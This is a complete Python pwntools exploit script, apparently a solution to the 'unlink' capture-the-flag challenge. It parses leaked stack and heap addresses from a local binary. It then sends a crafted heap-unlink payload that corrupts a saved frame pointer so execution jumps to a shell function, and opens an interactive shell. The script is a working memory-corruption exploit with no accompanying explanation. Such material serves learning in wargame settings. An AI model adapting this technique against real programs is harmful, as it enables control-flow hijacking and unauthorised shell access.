from pwn import *

context.log_level = 'debug'
p = process("/home/unlink/unlink")

stack_leak = int(p.recvline().decode().split()[-1], 16)
heap_leak = int(p.recvline().decode().split()[-1], 16)

print(stack_leak, heap_leak)

shell_addr = 0x80491d6
ebp_stack_addr = stack_leak - 28
a_buf_addr = heap_leak + 8

payload = p32(shell_addr) + b'a' * 4 + p32(a_buf_addr + 4) + b'a' * 12 + p32(a_buf_addr + 16) + p32(ebp_stack_addr)
p.sendline(payload)

p.interactive()